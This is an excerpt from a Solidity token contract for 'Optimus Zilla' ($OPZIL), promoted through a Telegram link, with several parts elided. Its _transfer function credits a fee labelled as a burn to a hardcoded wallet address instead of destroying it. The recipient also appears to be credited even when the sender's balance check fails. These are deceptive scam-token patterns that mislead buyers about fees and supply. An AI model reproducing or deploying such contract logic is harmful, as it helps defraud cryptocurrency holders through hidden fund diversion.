...
// Submitted for Telegram: https://t.me/optimuszillabsc
...
contract  OptimusZilla  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Optimus Zilla";
    string private _symbol = "$OPZIL";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x70f7956af6a117BD9f52228b046c320445a63526] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x70f7956af6a117BD9f52228b046c320445a63526, _bruntoken);
        }
